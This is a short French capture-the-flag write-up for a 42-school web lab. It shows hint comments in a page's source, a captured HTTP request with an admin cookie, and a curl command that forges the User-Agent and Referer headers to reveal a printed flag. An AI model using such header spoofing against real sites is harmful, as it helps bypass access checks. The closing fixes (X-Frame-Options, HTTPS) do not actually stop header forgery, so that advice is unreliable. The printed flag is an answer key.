Lien tout en bas de home : 

dans les commentaire du code on trouve des indices au milieu de pas mal d'article à la 42. 
<!--
You must cumming from : "https://www.nsa.gov/" to go to the next step
-->
et 
<!--																			
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->

On récupère la requete (en tête)
Requête
GET / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Host: 192.168.43.114
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Referer: http://192.168.43.114/
Accept-Language: fr-fr
Connection: keep-alive

pour changer de navigateur internet on utilise user-agent, et pour définir la page précédente 
On nous indique de modifier ses valeurs. Pour cela on peut utiliser les options de curl suivantes :
ps: on grep le résultats pour ne pas afficher toutes la page. 
curl -A ft_bornToSec --referer https://www.nsa.gov/ 'http://192.168.43.114/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' | grep flag

On obtiens bien un flag : 
The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

Probleme: 
le suivi ou le vol d'informations

Pour prévenir d'une modification d'en tête il est possible de configurer un en-tête X-Frame-Options
avec .htaccess.
Utiliser HTTPS, qui cachent des informations sensible (tel que l'origine de la requete)